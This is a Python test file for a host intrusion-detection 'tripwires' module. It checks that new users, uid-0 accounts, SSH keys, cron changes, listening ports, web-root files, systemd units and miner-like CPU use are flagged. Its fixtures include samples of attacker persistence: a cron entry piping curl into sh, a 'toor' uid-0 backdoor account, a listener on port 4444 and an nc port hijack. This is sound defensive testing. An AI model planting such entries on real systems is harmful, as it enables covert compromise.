from companion import parsers as P
from companion.tripwires import diff, evaluate_processes, process_baseline


def test_no_change_no_findings():
    base = P.parse_passwd("root:x:0:0::/root:/bin/sh\n")
    assert diff("users", base, dict(base)) == []


def test_new_user_and_uid0():
    base = P.parse_passwd("root:x:0:0::/root:/bin/sh\n")
    cur = P.parse_passwd("root:x:0:0::/root:/bin/sh\nevil:x:1001:1001::/home/evil:/bin/sh\n"
                         "toor:x:0:0::/root:/bin/sh\n")
    f = {x.key: x for x in diff("users", base, cur)}
    assert set(f) == {"evil", "toor"}
    assert f["evil"].severity == "high" and f["toor"].severity == "critical"
    assert f["evil"].tripwire == "new_user" and f["evil"].change == "added"


def test_user_changed_to_uid0_is_critical():
    base = P.parse_passwd("bob:x:1000:1000::/home/bob:/bin/sh\n")
    cur = P.parse_passwd("bob:x:0:1000::/home/bob:/bin/sh\n")
    [f] = diff("users", base, cur)
    assert f.change == "changed" and f.severity == "critical"


def test_removed_items_are_not_alerts():
    base = P.parse_passwd("root:x:0:0::/root:/bin/sh\nold:x:5:5::/:/bin/sh\n")
    cur = P.parse_passwd("root:x:0:0::/root:/bin/sh\n")
    assert diff("users", base, cur) == []


def test_ssh_key_added():
    base = P.parse_authorized_keys("==> t /h/.ssh/authorized_keys <==\nssh-ed25519 AAAA1 a\n")
    cur = P.parse_authorized_keys("==> t /h/.ssh/authorized_keys <==\nssh-ed25519 AAAA1 a\nssh-ed25519 AAAA2 b\n")
    [f] = diff("ssh_keys", base, cur)
    assert f.tripwire == "ssh_key" and "t" in f.title


def test_cron_changed_shows_lines():
    base = P.parse_cron("==> /etc/crontab <==\n0 * * * * root a\n")
    cur = P.parse_cron("==> /etc/crontab <==\n0 * * * * root a\n* * * * * root curl x|sh\n")
    [f] = diff("cron", base, cur)
    assert f.change == "changed"
    assert f.detail["lines_added"] == ["* * * * * root curl x|sh"]


def test_ports_new_and_rebind_noise():
    base = P.parse_ports('LISTEN 0 1 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=1,fd=1))\n')
    # pid changed + extra v6 bind: not a finding
    same = P.parse_ports('LISTEN 0 1 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=99,fd=1))\n'
                         'LISTEN 0 1 [::]:80 [::]:* users:(("nginx",pid=99,fd=2))\n')
    assert diff("ports", base, same) == []
    cur = dict(same)
    cur.update(P.parse_ports('LISTEN 0 5 0.0.0.0:4444 0.0.0.0:* users:(("python3",pid=7,fd=3))\n'))
    [f] = diff("ports", base, cur)
    assert f.key == "tcp/4444" and "python3" in f.title
    # different owner of an existing port is a (medium) change
    hijack = P.parse_ports('LISTEN 0 1 0.0.0.0:80 0.0.0.0:* users:(("nc",pid=5,fd=1))\n')
    [g] = diff("ports", base, hijack)
    assert g.change == "changed" and g.severity == "medium"


def test_webroot_new_and_modified():
    base = {"/var/www/html/index.html": {"mtime": 1, "size": 10}}
    cur = {"/var/www/html/index.html": {"mtime": 2, "size": 10},
           "/var/www/html/x.php": {"mtime": 3, "size": 5}}
    f = {x.key: x for x in diff("webroot", base, cur)}
    assert f["/var/www/html/x.php"].change == "added" and f["/var/www/html/x.php"].severity == "high"
    assert f["/var/www/html/index.html"].change == "changed"


def test_units_new():
    base = P.parse_units("a  /usr/lib/systemd/system/nginx.service\n")
    cur = P.parse_units("a  /usr/lib/systemd/system/nginx.service\nb  /etc/systemd/system/x.service\n")
    [f] = diff("units", base, cur)
    assert f.key == "x.service" and f.tripwire == "systemd_unit"


def test_fingerprint_stable_and_value_sensitive():
    base = {}
    a = diff("webroot", base, {"/p": {"mtime": 1, "size": 1}})[0]
    b = diff("webroot", base, {"/p": {"mtime": 1, "size": 1}})[0]
    c = diff("webroot", base, {"/p": {"mtime": 2, "size": 1}})[0]
    assert a.fingerprint("s") == b.fingerprint("s") != c.fingerprint("s")
    assert a.fingerprint("s") != a.fingerprint("other")


def _procs(*rows):
    return [{"pid": i, "user": "u", "cpu": cpu, "args": name, "name": name} for i, (name, cpu) in enumerate(rows)]


def test_cpu_needs_consecutive_scans():
    base = process_baseline(_procs(("nginx", 0), ("sshd", 0)))
    streaks = {}
    f1, streaks = evaluate_processes(_procs(("kdevtmpfsi", 99), ("nginx", 90)), base, [], streaks, 50, 2)
    assert f1 == [] and streaks == {"kdevtmpfsi": 1}  # known nginx never counts
    f2, streaks = evaluate_processes(_procs(("kdevtmpfsi", 98)), base, [], streaks, 50, 2)
    assert len(f2) == 1 and f2[0].key == "kdevtmpfsi" and f2[0].detail["streak"] == 2
    # a quiet scan resets the streak
    f3, streaks = evaluate_processes(_procs(("kdevtmpfsi", 1)), base, [], streaks, 50, 2)
    assert f3 == [] and streaks == {}


def test_cpu_allowlist_and_threshold():
    base = process_baseline([])
    f, s = evaluate_processes(_procs(("ffmpeg", 99), ("x", 49.9)), base, ["ffmpeg"], {"ffmpeg": 5}, 50, 1)
    assert f == [] and s == {}


def test_cpu_same_name_fingerprint_stable():
    base = process_baseline([])
    f1, s = evaluate_processes(_procs(("m", 99)), base, [], {"m": 1}, 50, 2)
    f2, s = evaluate_processes(_procs(("m", 80)), base, [], s, 50, 2)
    assert f1[0].fingerprint("s") == f2[0].fingerprint("s")
